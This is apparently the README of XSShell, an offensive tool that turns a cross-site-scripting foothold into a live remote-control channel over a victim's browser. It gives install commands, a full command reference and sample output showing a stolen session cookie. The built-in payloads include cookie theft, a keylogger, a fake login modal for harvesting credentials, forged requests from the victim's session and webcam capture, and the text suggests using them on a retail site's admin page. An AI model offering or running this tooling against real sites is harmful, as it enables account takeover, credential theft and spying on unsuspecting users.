XSShell
=======

XSShell is a cross-site-scripting reverse shell... Okay, well maybe it's not a true reverse shell, but it will allow you to interact in real time with an XSS victim's browser.

Just run the xsshell binary to setup your listener endpoint, do your XSS thing to get the exploit js onto the victim's browser, and as soon as they run it you should see something like this popup in your console:

```
====== start socket: 1, header: AmaaKrM= ======
socket connected: 1
    user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134 
    page url:   http://example.com/ 
    referrer:   http://google.com/
    cookies:    phpsessid=abababababababab
======   end socket: 1, header: AmaaKrM= ======
```

Once you have a connection you can execute any javascript file you want on the browser, and have that script return data to your console. This may not seem very useful at first, but it allows you to be more tactical and react in real time to the environment that the script is running on. Environments like say... an admin page used to approve and manage orders placed on a retail site :)

XSShell also comes with a number of premade XSS payloads to use:

- \alert - send a js alert message
- \cs    - get cookies and any updates to the cookies
- \gi    - download all images on the page
- \kl    - key logger
- \ll    - list all links on the page
- \src   - download the current page source
- \pfl   - show the user a modal and prompt them to login
- \xhr   - make xhr requests in the context of the victim's browser
- \ct    - crash the victim's browser tab
- \wcs   - attempt to take a snapshot from the victim's webcam (WARNING: most modern browsers will prompt for access to webcams)

Install
-------

To install xsshell run:
```bash
go get github.com/raz-varren/xsshell
go install github.com/raz-varren/xsshell
```

Mods
------

If you modify any of the JS files in this package, make sure you run:
```bash
go generate github.com/raz-varren/xsshell...
go install github.com/raz-varren/xsshell
```

This will ensure that the updated files are packed into the binary.

Usage
-----

The xsshell command:
```
xsshell -h
Usage of xsshell:
  -cert string
    	ssl cert file
  -host string
    	websocket listen address
  -key string
    	ssl key file
  -log string
    	specify a log file to log all console communication
  -path string
    	websocket connection path (default "/s")
  -port string
    	websocket listen port (default "8234")
  -servdir string
    	specify a directory to serve files from. a file server will not be started if no directory is specified
  -servpath string
    	specify the base url path that you want to serve files from (default "/static/")
  -wrkdir string
    	working directory that will be used as the relative root path for any commands requiring user provided file paths (default "./")
```

Starting the shell console:
```
xsshell 
listening for sockets on :8234, at url path: /s
starting console
type \? to list available commands
xsshell > 
xsshell > \?
xsshell > \help \? \h: list available commands
xsshell > \alert:      send an alert message to the target set
xsshell >                  usage: \alert ALERT_MESSAGE
xsshell > \cs:         get the current cookies from the target set's current page and any cookie updates.
xsshell > \ct:         crash the target set's tab
xsshell > \emd:        return a list of media devices accessible to the target set's browser
xsshell > \ex:         print out the client exploit javascript
xsshell > \exm:        print out the minified version of the client exploit javascript
xsshell > \gi:         download all images on the target set's page. 
xsshell >              images will be stored in DOWNLOAD_DIR. 
xsshell >              relative file paths are relative to the path provided to -wrkdir
xsshell >                  usage: \gi [DOWNLOAD_DIR]
xsshell >                  examples:
xsshell >                      \gi
xsshell >                      \gi /tmp/images
xsshell >                      \gi imgdir
xsshell > \kl:         start a keylogger on the target set
xsshell > \ll:         list out any links found on the target set's currently open page
xsshell > \pfl:        open a modal on the target set's page prompting them for a username and password
xsshell > \ps:         print out socket info for all actively connected websockets
xsshell > \q:          exit this program
xsshell > \sf:         send a javascript file to the target set and execute it. 
xsshell >              any data can be returned from the target set by calling `this.send(\"return data string\");` in the script. 
xsshell >              relative file paths are relative to the path provided to -wrkdir
xsshell >                  usage: \sf FILE_PATH
xsshell > \sfl:        resend the last file that was sent using \sf, includes any new changes to the file
xsshell > \src:        get the target set's currently rendered page source
xsshell > \st:         set the websockets to target. one or more targets can be set with the following methods:
xsshell >              *        -targets all active websocket connections (default target set)
xsshell >              8        -target a single websocket connection belonging to that id number
xsshell >              1,2,8,10 -targets all websocket IDs in the comma separated list
xsshell >              4-16     -targets all websocket IDs from the lowest number listed to the highest number listed
xsshell >              4-       -targets all websocket IDs that are greater than or equal to the listed number
xsshell >              -16      -targets all websocket IDs that are less than or equal to the listed number
xsshell >                  usage: \st TARGET_SET
xsshell >                  examples:
xsshell >                      \st *
xsshell >                      \st 2
xsshell >                      \st 2,4,7
xsshell >                      \st 10-15
xsshell >                      \st 6-
xsshell >                      \st -100
xsshell > \wcs:        attempt to take a snapshot from the target set's webcam, if one is available. 
xsshell >              images will be stored in DOWNLOAD_DIR. 
xsshell >              relative file paths are relative to the path provided to -wrkdir.
xsshell >              NOTE: using this command may prompt the target set for webcam access. 
xsshell >              the target set may reject the prompt, or ignore it entirely.
xsshell >                  usage: \ws [DOWNLOAD_DIR]
xsshell >                  examples:
xsshell >                      \wcs /tmp/webcam_snaps
xsshell >                      \wcs snaps
xsshell > \xhr:        send an xhr request from the target set's current page
xsshell >                  usage: \xhr HTTP_METHOD FULL_URL [CONTENT_HEADER] [POST_BODY]
xsshell >                  examples:
xsshell >                      \xhr GET https://google.com/
xsshell >                      \xhr POST https://google.com/ application/json {"hello": "world"}
xsshell >
```

